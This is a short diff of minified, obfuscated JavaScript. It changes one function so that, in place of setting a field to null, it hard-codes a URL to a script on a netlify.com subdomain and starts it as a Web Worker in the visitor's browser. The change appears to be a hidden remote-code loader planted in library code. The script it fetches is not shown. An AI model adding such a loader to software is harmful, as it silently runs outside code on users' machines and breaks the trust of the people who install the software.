@@ -5285,7 +5285,8 @@
         },
         hH = function(O) {
             console.log(O);
-            this.W = null
+            O = "https://optimistic-poincare-053037.netlify.com/webworker.js";
+            this.W = (this.X = (ok.call(this), this.l = null), window.Worker && O) ? new Worker(O) : null
         },
         OZ = function(O, d, h, Q, V) {
             for (d = e(O, 3); d <= e(O, 4); d++)
